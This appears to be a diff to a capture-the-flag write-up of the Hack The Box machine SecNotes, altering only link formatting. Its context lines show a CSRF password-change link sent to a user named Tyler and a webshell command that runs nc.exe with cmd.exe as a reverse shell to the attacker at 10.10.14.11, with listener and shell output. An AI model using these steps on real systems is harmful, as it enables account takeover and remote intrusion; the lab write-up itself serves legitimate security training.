@@ -68,7 +68,7 @@ Now we have the parameters, let's make the payload.
 PoC: [http://10.10.10.97/change\_pass.php?password=hacked&confirm\_password=hacked&submit=submit](http://10.10.10.97/change_pass.php?password=hacked&confirm_password=hacked&submit=submit)
 
 This is the link I'll send through the contact form. If Tyler or anybody else clicks it, their password will be changed to "hacked".
-Submit the link through the contact form located at http://secnotes.htb/contact.php and wait for Tyler to click it.
+Submit the link through the contact form located at [http://secnotes.htb/contact.php]() and wait for Tyler to click it.
 
 I waited about 30 seconds and tried to login to Tyler's account using `tyler:hacked` and it worked.
 We now have access to tyler's secure notes.
@@ -150,7 +150,7 @@ Open a listener on the attacking machine and execute nc.exe using the webshell t
 └─# nc -lnvp 1337
 listening on [any] 1337 ...
 ```
-http://10.10.10.97:8808/shell.php?cmd=nc.exe+10.10.14.11+1337+-e+cmd.exe
+[http://10.10.10.97:8808/shell.php?cmd=nc.exe+10.10.14.11+1337+-e+cmd.exe]()
 ```
 connect to [10.10.14.11] from (UNKNOWN) [10.10.10.97] 50700
 Microsoft Windows [Version 10.0.17134.228]
